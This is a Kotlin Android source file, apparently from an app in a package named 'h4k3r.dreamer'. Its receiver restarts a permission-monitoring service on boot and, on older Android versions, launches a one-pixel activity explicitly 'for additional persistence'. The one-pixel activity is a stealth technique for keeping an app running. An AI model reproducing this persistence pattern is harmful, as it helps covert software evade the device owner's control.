package com.h4k3r.dreamer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class RestartReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED -> {
                val serviceIntent = Intent(context, PermissionMonitorService::class.java)
                if (Build.VERSION.SDK_INT >= 26) {
                    ContextCompat.startForegroundService(context, serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
            }
            else -> {
                if (Build.VERSION.SDK_INT >= 31) {
                    // Use WorkManager for background-safe service start
                    val workRequest = OneTimeWorkRequestBuilder<PermissionMonitorWorker>()
                        .setInitialDelay(5, TimeUnit.SECONDS)
                        .build()
                    WorkManager.getInstance(context).enqueue(workRequest)
                } else {
                    val serviceIntent = Intent(context, PermissionMonitorService::class.java)
                    context.startService(serviceIntent)
                }
            }
        }

        // Start OnePixelActivity for additional persistence (only on Android < 12)
        if (Build.VERSION.SDK_INT < 31) {
            try {
                val activityIntent = Intent(context, OnePixelActivity::class.java)
                activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(activityIntent)
            } catch (e: Exception) {
                // Ignore if activity can't be started
            }
        }
    }
} 